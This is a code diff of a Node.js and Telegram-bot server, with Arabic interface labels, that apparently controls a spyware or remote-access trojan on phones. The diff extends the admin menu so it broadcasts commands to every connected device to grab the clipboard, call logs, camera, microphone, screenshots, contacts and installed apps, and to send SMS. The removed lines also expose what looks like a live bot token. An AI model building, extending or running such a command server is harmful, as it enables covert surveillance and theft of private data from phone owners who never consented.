@@ -3,10 +3,10 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const multer = require('multer');
-const fs = require('fs');
 
-const TOKEN = '8910918204:AAHdGkvLbJKbHspDW25d4OPEPL0P0jHudkA';
+const TOKEN = 'ضع_التوكن_هنا';
 const ADMIN_ID = 7294984974;
+const PORT = process.env.PORT || 3000;
 
 const bot = new TelegramBot(TOKEN, { polling: true, request: { timeout: 30000 } });
 const app = express();
@@ -34,7 +34,7 @@ bot.on('message', msg => {
     const target = appData.get('target');
 
     if (text === '/start') {
-        bot.sendMessage(chatId, 'مرحبا بك:', { reply_markup: { keyboard: [['الأجهزة', 'الجميع']], resize_keyboard: true } });
+        bot.sendMessage(chatId, 'مرحبا بك:', { reply_markup: { keyboard: [['الأجهزة', 'الجميع'], ['عن لنا']], resize_keyboard: true } });
         return;
     }
     if (text === 'الأجهزة') {
@@ -46,10 +46,18 @@ bot.on('message', msg => {
     }
     if (text === 'الجميع') {
         appData.set('target', 'all');
-        bot.sendMessage(chatId, 'اختر:', { reply_markup: { keyboard: [['لقطة', 'مايك', 'جهات']], resize_keyboard: true } });
+        bot.sendMessage(chatId, 'اختر:', { reply_markup: { keyboard: [
+            ['الحافظة', 'المكالمات'], ['الكاميرا', 'لقطة شاشة'],
+            ['المايك', 'جهات الاتصال'], ['التطبيقات', 'إرسال SMS'],
+            ['عن لنا']
+        ], resize_keyboard: true } });
         return;
     }
-    const commands = { 'لقطة': 'screenshot', 'مايك': 'microphone', 'جهات': 'contacts' };
+    const commands = {
+        'الحافظة': 'clipboard', 'المكالمات': 'calls', 'الكاميرا': 'main-camera',
+        'لقطة شاشة': 'screenshot', 'المايك': 'microphone', 'جهات الاتصال': 'contacts',
+        'التطبيقات': 'apps', 'إرسال SMS': 'sendSms'
+    };
     if (commands[text]) {
         const payload = { request: commands[text], extras: [] };
         if (target === 'all') io.emit('commend', payload);
@@ -60,4 +68,4 @@ bot.on('message', msg => {
     }
 });
 
-server.listen(process.env.PORT || 3000, () => console.log('Server running'));
+server.listen(PORT, () => console.log('Server running on ' + PORT));
